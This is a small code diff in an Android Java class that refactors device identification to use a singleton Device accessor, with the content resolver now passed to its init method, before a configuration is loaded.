@@ -53,8 +53,8 @@ public class CoreThread extends Activity implements Runnable {
 			Configuration conf = new Configuration(this.resources);
 			
 			// Identify the device uniquely 
-			Device device = new Device(contentResolver);
-			device.init();
+			Device device = Device.self();
+			device.init(contentResolver);
 			
 			// Load the configuration
 			conf.LoadConfiguration();
